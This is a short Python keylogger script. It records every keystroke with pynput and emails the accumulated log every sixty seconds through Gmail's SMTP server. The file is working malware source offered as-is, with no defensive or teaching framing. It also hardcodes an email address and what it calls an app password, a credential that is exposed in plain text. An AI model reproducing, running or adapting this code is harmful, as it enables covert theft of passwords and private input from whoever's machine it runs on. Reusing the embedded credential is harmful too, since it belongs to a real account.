import smtplib
from email.mime.text import MIMEText
import ssl
from pynput import keyboard
import threading
import time

# Configuration
EMAIL_ADDRESS = "ahadshaikh1504@gmail.com"
EMAIL_PASSWORD = "xkmz cshj ogsp kskv"  # App password
INTERVAL = 60  # seconds

keystrokes = []

# Function to handle key presses
def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f"[{key.name}]")

# Function to send email
def send_email(log):
    try:
        message = MIMEText(log)
        message["Subject"] = "Keylogger Log"
        message["From"] = EMAIL_ADDRESS
        message["To"] = EMAIL_ADDRESS

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"Email sending failed: {e}")

# Periodic email sender
def report():
    if keystrokes:
        log = "".join(keystrokes)
        send_email(log)
        keystrokes.clear()
    threading.Timer(INTERVAL, report).start()

# Main
def main():
    print(f"Keylogger started. Sending logs every {INTERVAL} seconds.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    report()
    listener.join()

if __name__ == "__main__":
    main()
